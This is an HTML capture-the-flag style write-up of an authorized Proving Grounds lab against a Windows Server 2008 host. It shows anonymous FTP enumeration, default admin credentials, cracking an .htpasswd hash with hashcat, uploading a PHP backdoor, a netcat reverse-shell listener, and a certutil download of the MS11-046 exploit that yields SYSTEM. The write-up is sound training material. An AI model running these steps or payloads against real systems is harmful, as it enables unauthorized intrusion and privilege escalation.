@@ -1,0 +1,363 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="This lab involves exploiting an anonymous FTP server to gain initial access. Learners will enumerate the target to discover credentials for an admin FTP account, then upload a malicious PHP reverse shell for remote execution. The final step involves using the Task Scheduler Privilege Escalation exploit to gain administrative access on the target. This lab focuses on enumeration, credential discovery, web shell deployment, and privilege escalation."><title>Proving Grounds: AuthBy</title><style>
+  :root { --muted:#9aa4b2; --accent:#facc15; --text:#e6eef6; --mono:ui-monospace,SFMono-Regular,Menlo,Monaco,"Roboto Mono","Courier New",monospace; --maxw:900px; }
+  * { box-sizing:border-box; } html { scroll-behavior:smooth; }
+  body { margin:0; background:linear-gradient(180deg,#071021 0%,#0f1724 50%); color:var(--text); font-family:Inter,"Segoe UI",Roboto,system-ui,-apple-system,sans-serif; -webkit-font-smoothing:antialiased; line-height:1.6; }
+  .wrap { max-width:var(--maxw); margin:40px auto; padding:28px; background:linear-gradient(180deg,rgba(255,255,255,.02),rgba(255,255,255,.01)); border:1px solid rgba(255,255,255,.03); border-radius:12px; box-shadow:0 6px 30px rgba(2,6,23,.6); }
+  .site-header { display:flex; align-items:center; justify-content:space-between; gap:16px; padding-bottom:18px; margin-bottom:24px; border-bottom:1px solid rgba(255,255,255,.06); }
+  .site-brand { color:var(--accent); font-weight:750; letter-spacing:.02em; text-decoration:none; } .site-brand:hover,.site-link:hover { color:#ffe57a; } .site-link { color:var(--muted); font-size:13px; text-decoration:none; } .back-button { padding:7px 11px; border:1px solid rgba(250,204,21,.24); border-radius:7px; background:rgba(250,204,21,.08); color:var(--accent); font-weight:650; }
+  .target-tag { display:inline-block; margin-bottom:12px; padding:5px 10px; border:1px solid rgba(250,204,21,.24); border-radius:999px; color:var(--accent); background:rgba(250,204,21,.1); font-size:12px; font-weight:700; letter-spacing:.08em; text-transform:uppercase; }
+  header h1 { margin:0; font-size:28px; letter-spacing:-.2px; line-height:1.25; } header p { margin:8px 0 0; color:var(--muted); font-size:14px; }
+  .meta { display:flex; flex-wrap:wrap; gap:12px; align-items:center; margin-top:18px; color:var(--muted); font-size:13px; } .badge { background:rgba(250,204,21,.12); color:var(--accent); padding:6px 10px; border-radius:999px; font-weight:600; font-size:13px; }
+  nav.toc { margin-top:22px; padding:14px; background:rgba(255,255,255,.02); border:1px solid rgba(255,255,255,.02); border-radius:8px; } nav.toc ul { display:flex; flex-wrap:wrap; gap:10px; margin:0; padding:0; list-style:none; } nav.toc a { color:var(--muted); text-decoration:none; font-size:13px; } nav.toc a:hover { color:var(--accent); }
+  article { margin-top:28px; } h2 { margin-top:30px; color:var(--accent); font-size:22px; scroll-margin-top:20px; } h3 { margin-top:22px; color:#dfe9f6; font-size:17px; } h4,h5,h6 { color:#dfe9f6; } p,li { overflow-wrap:anywhere; } a { color:var(--accent); } strong { color:#f4f8fc; }
+  blockquote { margin:16px 0; padding:10px 12px; color:var(--muted); background:rgba(250,204,21,.06); border-left:3px solid rgba(250,204,21,.22); border-radius:4px; }
+  .code-brief { margin:18px 0 8px; color:var(--muted); font-size:14px; }
+  pre { margin:12px 0; padding:14px; overflow:auto; color:#dff3ff; background:#041022; border:1px solid rgba(255,255,255,.03); border-radius:8px; box-shadow:0 6px 18px rgba(2,6,23,.5); font:13px/1.55 var(--mono); } code { padding:2px 6px; border-radius:4px; background:rgba(255,255,255,.04); font-family:var(--mono); font-size:.9em; } pre code { padding:0; background:transparent; font-size:inherit; }
+  table { width:100%; margin-top:12px; border-collapse:collapse; } th,td { padding:8px; border-bottom:1px solid rgba(255,255,255,.06); text-align:left; color:var(--muted); font-size:14px; } th { color:#dfe9f6; font-weight:600; } hr { border:0; border-top:1px solid rgba(255,255,255,.08); margin:28px 0; } img { max-width:100%; border-radius:8px; }
+  footer { margin-top:30px; padding-top:12px; border-top:1px solid rgba(255,255,255,.02); color:var(--muted); font-size:13px; text-align:center; }
+  @media (max-width:720px) { .wrap { margin:18px; padding:16px; } header h1 { font-size:20px; } nav.toc ul { flex-direction:column; gap:6px; } }
+</style></head><body><main class="wrap"><div class="site-header"><a class="site-brand" href="index.html">Karan Tank</a><a class="site-link back-button" href="index.html">← Back to index</a></div><header><span class="target-tag">Target: Windows</span><h1>Proving Grounds: AuthBy</h1><p>This lab involves exploiting an anonymous FTP server to gain initial access. Learners will enumerate the target to discover credentials for an admin FTP account, then upload a malicious PHP reverse shell for remote execution. The final step involves using the Task Scheduler Privilege Escalation exploit to gain administrative access on the target. This lab focuses on enumeration, credential discovery, web shell deployment, and privilege escalation.</p><div class="meta"><span class="badge">Proving Grounds</span><span>Authorized lab writeup</span><span>Cybersecurity portfolio</span></div></header><nav class="toc" aria-label="Table of contents"><ul><li><a href="#scenario">Scenario</a></li><li><a href="#learning-objectives">Learning objectives</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#initial-access">Initial Access</a></li><li><a href="#privilege-escalation">Privilege Escalation</a></li><li><a href="#takeaways">Takeaways</a></li></ul></nav><article><blockquote>
+<p><strong>Authorized-lab note:</strong> This writeup documents activity performed exclusively in an authorized Offensive Security Proving Grounds lab. It is shared for educational and portfolio purposes.</p>
+</blockquote>
+<p>Exploit the target through Anonymous FTP, deducing the admin credentials to gain access and escalate privileges. This exercise enhances your skills in FTP exploitation and privilege escalation techniques.</p>
+<h2 id="scenario">Scenario</h2>
+<p>This lab involves exploiting an anonymous FTP server to gain initial access. Learners will enumerate the target to discover credentials for an admin FTP account, then upload a malicious PHP reverse shell for remote execution. The final step involves using the Task Scheduler Privilege Escalation exploit to gain administrative access on the target. This lab focuses on enumeration, credential discovery, web shell deployment, and privilege escalation.</p>
+<h2 id="learning-objectives">Learning objectives</h2>
+<p><strong>After completion of this lab, learners will be able to:</strong></p>
+<ul>
+<li>Enumerate the target system to identify an open anonymous FTP service.</li>
+<li>Discover and utilize admin FTP credentials to access sensitive files.</li>
+<li>Upload and execute a PHP reverse shell to gain remote access.</li>
+<li>Enumerate the operating system and identify privilege escalation opportunities.</li>
+<li>Exploit the Task Scheduler Privilege Escalation vulnerability to achieve administrative access.</li>
+</ul>
+<h2 id="enumeration">Enumeration</h2>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>┌──(kali㉿kali)-[~/offsec/authby]
+# Read the file contents for useful configuration or credential data.
+
+└─$ cat ./.htpasswd          
+offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0</code></pre><ul>
+<li>$apr1$ is a apache md5 encryption</li>
+</ul>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>(kali㉿kali)-[~/offsec/authby]
+# Read the file contents for useful configuration or credential data.
+
+└─$ cat ./.htpasswd          
+offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>┌──(kali㉿kali)-[~/offsec/authby]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ vim hash.txt</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>┌──(kali㉿kali)-[~/offsec/authby]
+# Attempt to recover a password from the captured hash material.
+
+└─$ hashcat -hh | grep &#39;\$apr1\$&#39;
+# Execute the next evidence-gathering step in the authorized lab.
+
+   1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)                      | FTP, HTTP, SMTP, LDAP Server</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>┌──(kali㉿kali)-[~/offsec/authby]
+# Attempt to recover a password from the captured hash material.
+
+└─$ hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt    
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output contains credential-related evidence recovered during the lab.
+
+* Device #01: cpu-sandybridge-Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz, 2944/5889 MB (1024 MB allocatable), 6MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory allocated for this attack: 513 MB (3679 MB free)
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output records the result observed during this authorized lab step.
+
+$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0:elite</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>Session..........: hashcat
+Status...........: Cracked
+# Execute the next evidence-gathering step in the authorized lab.
+
+Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
+Hash.Target......: $apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
+Time.Started.....: Thu Jun 11 20:36:23 2026 (1 sec)
+Time.Estimated...: Thu Jun 11 20:36:24 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:    26648 H/s (15.09ms) @ Accel:76 Loops:1000 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 25536/14344385 (0.18%)
+Rejected.........: 0/25536 (0.00%)
+Restore.Point....: 25080/14344385 (0.17%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1000
+Candidate.Engine.: Device Generator
+Candidates.#01...: sentimiento -&gt; ngapuhi
+Hardware.Mon.#01.: Util: 89%
+
+Started: Thu Jun 11 20:36:02 2026
+Stopped: Thu Jun 11 20:36:25 2026</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output records the result observed during this authorized lab step.
+
+local: shell.exe remote: shell.exe
+229 Entering Extended Passive Mode (|||2118|)
+150 File status okay; about to open data connection.
+100% |*******************************************************************************|  7680       84.18 MiB/s    00:00 ETA
+226 Closing data connection.
+7680 bytes sent in 00:00 (125.02 KiB/s)
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||2119|)
+150 Opening connection for /bin/ls.
+total 11
+-r--r--r--   1 root     root         7680 Jun 12 07:50 shell.exe
+-r--r--r--   1 root     root           76 Nov 08  2011 index.php
+-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
+-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
+226 Closing data connection.</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output records the result observed during this authorized lab step.
+
+ftp&gt; put simple-backdoor.php
+local: simple-backdoor.php remote: simple-backdoor.php
+229 Entering Extended Passive Mode (|||2120|)
+150 File status okay; about to open data connection.
+100% |*******************************************************************************|   328        4.22 MiB/s    00:00 ETA
+226 Closing data connection.
+328 bytes sent in 00:00 (5.16 KiB/s)
+ftp&gt; dir
+229 Entering Extended Passive Mode (|||2121|)
+150 Opening connection for /bin/ls.
+total 12
+-r--r--r--   1 root     root          328 Jun 12 07:52 simple-backdoor.php
+-r--r--r--   1 root     root         7680 Jun 12 07:50 shell.exe
+-r--r--r--   1 root     root           76 Nov 08  2011 index.php
+-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
+-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
+226 Closing data connection.</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Execute the next evidence-gathering step in the authorized lab.
+
+C:\Users\apache\Desktop&gt;systeminfo
+systeminfo
+
+Host Name:                 LIVDA
+OS Name:                   Microsoftr Windows Serverr 2008 Standard 
+OS Version:                6.0.6001 Service Pack 1 Build 6001
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                92573-OEM-7502905-27565
+Original Install Date:     12/19/2009, 11:25:57 AM
+System Boot Time:          6/12/2026, 12:01:08 PM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (GMT-08:00) Pacific Time (US &amp; Canada)
+Total Physical Memory:     2,047 MB
+Available Physical Memory: 1,663 MB
+Page File: Max Size:       1,985 MB
+Page File: Available:      1,543 MB
+Page File: In Use:         442 MB
+Page File Location(s):     N/A
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           N/A</code></pre><h2 id="initial-access">Initial Access</h2>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code># The scan output identifies the target&#39;s exposed services and their versions.
+
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           zFTPServer 6.0 build 2011-10-17
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| total 9680
+| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
+| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
+| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
+| ----------   1 root     root           17 Aug 13  2011 StopService.bat
+| ----------   1 root     root           18 Aug 13  2011 StartService.bat
+| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
+| dr-xr-xr-x   1 root     root          512 Jun 12 07:15 log
+| ----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
+| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
+| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
+| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
+|_dr-xr-xr-x   1 root     root          512 Aug 02  2024 accounts
+242/tcp  open  http          Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
+| http-auth:                                                                                                                
+| HTTP/1.1 401 Authorization Required\x0D                                                                                   
+|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!                                                               
+|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8                                                                       
+|_http-title: 401 Authorization Required                                                                                    
+3145/tcp open  zftp-admin    zFTPServer admin
+3389/tcp open  ms-wbt-server Microsoft Terminal Service
+| rdp-ntlm-info: 
+|   Target_Name: LIVDA
+|   NetBIOS_Domain_Name: LIVDA
+|   NetBIOS_Computer_Name: LIVDA
+|   DNS_Domain_Name: LIVDA
+|   DNS_Computer_Name: LIVDA
+|   Product_Version: 6.0.6001
+|_  System_Time: 2026-06-12T00:16:09+00:00
+| ssl-cert: Subject: commonName=LIVDA
+| Not valid before: 2024-08-01T10:50:21
+|_Not valid after:  2025-01-31T10:50:21
+|_ssl-date: 2026-06-12T00:16:14+00:00; 0s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>(kali㉿kali)-[~/offsec/authby]
+# Inspect the FTP service and retrieve accessible lab files.
+
+└─$ ftp 192.168.180.46 21  
+Connected to 192.168.180.46.
+220 zFTPServer v6.0, build 2011-10-17 15:25 ready.
+Name (192.168.180.46:kali): anonymous
+331 User name received, need password.
+Password: 
+230 User logged in, proceed.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||2098|)
+150 Opening connection for /bin/ls.
+total 9680
+----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
+----------   1 root     root           25 Feb 10  2011 UninstallService.bat
+----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
+----------   1 root     root           17 Aug 13  2011 StopService.bat
+----------   1 root     root           18 Aug 13  2011 StartService.bat
+----------   1 root     root         8736 Nov 09  2011 Settings.ini
+dr-xr-xr-x   1 root     root          512 Jun 12 07:30 log
+----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
+----------   1 root     root           23 Feb 10  2011 InstallService.bat
+dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
+dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
+dr-xr-xr-x   1 root     root          512 Aug 02  2024 accounts
+226 Closing data connection.
+ftp&gt; cd accounts
+250 CWD Command successful.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||2099|)
+150 Opening connection for /bin/ls.
+total 4
+dr-xr-xr-x   1 root     root          512 Aug 02  2024 backup
+----------   1 root     root          764 Aug 02  2024 acc[Offsec].uac
+----------   1 root     root         1034 Jun 12 07:30 acc[anonymous].uac
+----------   1 root     root          928 Jun 12 07:30 acc[admin].uac
+226 Closing data connection.</code></pre><ul>
+<li>Using anonymous login, we only have read access, cannot download or open any files</li>
+<li>we see two users offsec and admin in accounts folder</li>
+<li>trying ftp again with admin:admin works</li>
+</ul>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code># Inspect the FTP service and retrieve accessible lab files.
+
+└─$ ftp 192.168.180.46 21
+Connected to 192.168.180.46.
+220 zFTPServer v6.0, build 2011-10-17 15:25 ready.
+Name (192.168.180.46:kali): admin
+331 User name received, need password.
+Password: 
+230 User logged in, proceed.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||2096|)
+150 Opening connection for /bin/ls.
+total 3
+-r--r--r--   1 root     root           76 Nov 08  2011 index.php
+-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
+-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
+226 Closing data connection.
+ftp&gt; get ./.htpasswd
+local: ./.htpasswd remote: ./.htpasswd
+229 Entering Extended Passive Mode (|||2097|)
+150 File status okay; about to open data connection.
+100% |***********************************************************|    45      325.52 KiB/s    00:00 ETA
+226 Closing data connection.
+45 bytes received in 00:00 (0.72 KiB/s)
+ftp&gt; exit
+221 Goodbye.</code></pre><ul>
+<li>using the credentials <code>offsec:elite</code> we are able to login into the http site on port 242</li>
+<li></li>
+<li>its a random website</li>
+<li>Checking ftp using <code>admin:admin</code> again, and we can see that we are able to upload file using put command</li>
+<li>uploading simple-backdoor.php and shell
+<a href="https://www.exploit-db.com/exploits/40564">https://www.exploit-db.com/exploits/40564</a></li>
+<li>Downloaded the version to compile but was getting erros</li>
+<li>found a precompiled exe</li>
+<li><a href="https://github.com/am0nsec/exploit/blob/master/windows/privs/MS11-046/ms11-046.exe">https://github.com/am0nsec/exploit/blob/master/windows/privs/MS11-046/ms11-046.exe</a></li>
+</ul>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code># Execute the next evidence-gathering step in the authorized lab.
+
+└─$ rlwrap nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.205] from (UNKNOWN) [192.168.180.46] 49163
+Microsoft Windows [Version 6.0.6001]
+Copyright (c) 2006 Microsoft Corporation.  All rights reserved.
+
+# Confirm the identity of the current session.
+
+C:\wamp\www&gt;whoami
+# Confirm the identity of the current session.
+
+whoami
+livda\apache
+
+# Review the Windows privileges available to the current account.
+
+C:\wamp\www&gt;whoami /priv
+# Review the Windows privileges available to the current account.
+
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</code></pre><ul>
+<li>Cannot run sigmapotato, godpotato or printspoofer</li>
+<li>also cannot run winPeas</li>
+<li>searching for system kernal exploits with version</li>
+</ul>
+<p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code># Execute the next evidence-gathering step in the authorized lab.
+
+C:\Users\apache\Desktop&gt;certutil -urlcache -split -f http://192.168.45.205/ms11-046.exe exploit.exe
+certutil -urlcache -split -f http://192.168.45.205/ms11-046.exe exploit.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+
+C:\Users\apache\Desktop&gt;.\exploit.exe
+.\exploit.exe
+
+# Confirm the identity of the current session.
+
+c:\Windows\System32&gt;whoami
+# Confirm the identity of the current session.
+
+whoami
+nt authority\system</code></pre><h2 id="takeaways">Takeaways</h2>
+<p>This lab reinforced the value of methodical enumeration, evidence-driven hypothesis testing, and validating each access-control boundary in an authorized environment.</p>
+</article><footer>Written by Karan Tank · Documented for educational and portfolio purposes in an authorized lab environment.</footer></main></body></html>
